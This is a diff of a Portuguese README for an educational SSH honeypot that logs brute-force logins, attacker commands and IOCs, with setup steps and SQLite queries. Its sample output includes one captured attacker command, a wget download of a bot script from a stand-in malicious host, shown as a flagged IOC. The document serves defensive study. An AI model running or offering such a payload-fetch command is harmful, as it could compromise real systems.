@@ -16,23 +16,25 @@ Honeypot SSH que simula um servidor SSH vulnerável para coletar informações s
 - GeoIP2 (geolocalização)
 
 ## Funcionalidades
-- Simula servidor SSH em porta customizável
-- Registra tentativas de login (brute force)
-- Captura comandos executados pelos atacantes
-- Geolocalização de IPs atacantes
-- Emula sistema de arquivos falso
-- Coleta de IOCs (IPs, usuários, senhas, malware)
-- Dashboard de estatísticas
-- Exportação de dados para threat intelligence
+-  Simula servidor SSH em porta customizável
+-  Registra tentativas de login (brute force)
+-  Captura comandos executados pelos atacantes
+-  Geolocalização de IPs atacantes
+-  Emula sistema de arquivos falso
+-  Coleta de IOCs (IPs, usuários, senhas, malware)
+-  Dashboard de estatísticas
+-  Exportação de dados para threat intelligence
 
 ## Instalação
 
 ```bash
-git clone https://github.com/444dex/cybersecurity-blue-team-portfolio.git
+git clone https://github.com/seu-usuario/ssh-honeypot.git
 cd ssh-honeypot
 
 python -m venv venv
-source venv/bin/activate
+source venv/bin/activate  # Linux/Mac
+# ou
+venv\Scripts\activate     # Windows
 
 pip install -r requirements.txt
 
@@ -40,37 +42,30 @@ pip install -r requirements.txt
 ssh-keygen -t rsa -f honeypot_key -N ""
 ```
 
-## Uso
+##  Uso
 
 ```bash
 # Executar honeypot na porta 2222
-sudo python ssh_honeypot.py --port 2222
+python ssh_honeypot.py --port 2222
 
-# Com geolocalização
-python ssh_honeypot.py --port 2222 --geoip
+# Especificar host e porta
+python ssh_honeypot.py --host 0.0.0.0 --port 2222
 
-# Visualizar estatísticas
-python stats_dashboard.py
-
-# Exportar dados
-python export_data.py --format json --output attacks.json
+# Usar chave SSH customizada
+python ssh_honeypot.py --key minha_chave
 ```
 
-## Estrutura do Projeto
+##  Estrutura do Projeto
 ```
 ssh-honeypot/
 ├── ssh_honeypot.py      # Servidor honeypot
-├── fake_shell.py        # Shell emulado
-├── database.py          # Gerenciamento SQLite
-├── stats_dashboard.py   # Dashboard de estatísticas
-├── export_data.py       # Exportação de dados
 ├── honeypot.db          # Banco de dados
 ├── logs/
-│   └── honeypot.log
+│   └── honeypot.log     # Logs de eventos
 └── requirements.txt
 ```
 
-## Dados Coletados
+##  Dados Coletados
 
 ### Tentativas de Login
 - IP de origem
@@ -96,23 +91,16 @@ ssh-honeypot/
 - Horários de maior atividade
 - Comandos mais executados
 
-## Exemplo de Output
+##  Exemplo de Output
 
 ```bash
-[*] SSH Honeypot iniciado na porta 2222
+[*] SSH Honeypot iniciado em 0.0.0.0:2222
 [*] Aguardando conexões...
 
 [2025-01-30 14:23:45] Nova conexão de 45.142.212.61:54321
 [2025-01-30 14:23:46] Tentativa de login:
   - Usuário: root
   - Senha: admin123
-  - País: Russia (RU)
-  - Resultado: FALHOU
-
-[2025-01-30 14:23:47] Tentativa de login:
-  - Usuário: admin
-  - Senha: password
-  - País: Russia (RU)
   - Resultado: SUCESSO (fake)
 
 [2025-01-30 14:23:48] Sessão iniciada - Comandos:
@@ -126,54 +114,87 @@ ssh-honeypot/
 [2025-01-30 14:24:15] Sessão encerrada
   - Duração: 27 segundos
   - Comandos executados: 6
-  - IOCs coletados: 1 URL maliciosa
+  -  COMANDO SUSPEITO: wget http://malicious.com/bot.sh
 ```
 
-## Dashboard de Estatísticas
+##  Dashboard de Estatísticas
 
-```
-╔═══════════════════════════════════════════════╗
-║        SSH HONEYPOT - ESTATÍSTICAS            ║
-╠═══════════════════════════════════════════════╣
-║ Total de tentativas de login: 1,247          ║
-║ IPs únicos: 89                                ║
-║ Sessões estabelecidas: 23                     ║
-║ Comandos capturados: 156                      ║
-╠═══════════════════════════════════════════════╣
-║ TOP 5 IPs ATACANTES                           ║
-╠═══════════════════════════════════════════════╣
-║ 1. 45.142.212.61 (RU) - 234 tentativas       ║
-║ 2. 103.212.91.45 (CN) - 187 tentativas       ║
-║ 3. 185.220.101.23 (NL) - 156 tentativas      ║
-║ 4. 91.201.67.89 (UA) - 143 tentativas        ║
-║ 5. 117.18.232.200 (IN) - 128 tentativas      ║
-╠═══════════════════════════════════════════════╣
-║ TOP 5 SENHAS MAIS USADAS                      ║
-╠═══════════════════════════════════════════════╣
-║ 1. admin - 456 vezes                          ║
-║ 2. 123456 - 398 vezes                         ║
-║ 3. password - 287 vezes                       ║
-║ 4. root - 234 vezes                           ║
-║ 5. 12345678 - 198 vezes                       ║
-╚═══════════════════════════════════════════════╝
+Para visualizar estatísticas dos ataques capturados:
+
+```bash
+# Conectar ao banco de dados
+sqlite3 honeypot.db
+
+# Ver tentativas de login
+SELECT username, password, COUNT(*) as tentativas 
+FROM login_attempts 
+GROUP BY username, password 
+ORDER BY tentativas DESC 
+LIMIT 10;
+
+# Ver comandos mais executados
+SELECT command, COUNT(*) as vezes 
+FROM commands 
+GROUP BY command 
+ORDER BY vezes DESC 
+LIMIT 10;
+
+# Ver IPs mais ativos
+SELECT source_ip, COUNT(*) as conexoes 
+FROM login_attempts 
+GROUP BY source_ip 
+ORDER BY conexoes DESC 
+LIMIT 10;
 ```
 
-## Aprendizados
-- Como honeypots funcionam
+##  Aprendizados
+Este projeto demonstra:
+- Como honeypots funcionam na prática
 - Padrões de comportamento de atacantes
-- Técnicas de ataque SSH comuns
-- Coleta de threat intelligence
-- Análise de IOCs
+- Técnicas de ataque SSH mais comuns
+- Coleta e análise de threat intelligence
+- Importância de senhas fortes
 
-## Considerações de Segurança
-- Execute em rede isolada ou VM
+##  Considerações de Segurança
+
+**IMPORTANTE:**
+- Execute APENAS em ambiente controlado (VM ou rede isolada)
 - Não exponha à internet sem proteção adequada
-- Monitore recursos do sistema
-- Tenha backups regulares do banco de dados
+- Monitore recursos do sistema regularmente
+- Faça backups regulares do banco de dados
+- Revise logs frequentemente para identificar padrões
 
-## Recursos
+##  Troubleshooting
+
+### Erro: "Chave SSH não encontrada"
+**Solução:** Gere a chave SSH:
+```bash
+ssh-keygen -t rsa -f honeypot_key -N ""
+```
+
+### Erro: "Permission denied" na porta 22
+**Solução:** Use porta > 1024 (ex: 2222) ou execute com sudo:
+```bash
+sudo python ssh_honeypot.py --port 22
+```
+
+### Erro: "No such file or directory: logs/honeypot.log"
+**Solução:** O código agora cria a pasta automaticamente, mas se persistir:
+```bash
+mkdir logs
+```
+
+##  Recursos
 - [The Honeynet Project](https://www.honeynet.org/)
 - [SANS - Honeypots](https://www.sans.org/white-papers/)
+- [Paramiko Documentation](https://www.paramiko.org/)
 
-## Licença
+##  Licença
 MIT License - Apenas para fins educacionais
+
+##  Autor
+Seu Nome - [LinkedIn](seu-linkedin) - [GitHub](seu-github)
+
+---
+
+⚠️ **AVISO LEGAL:** Este honeypot é apenas para fins educacionais. Use apenas em ambientes controlados e com autorização apropriada.
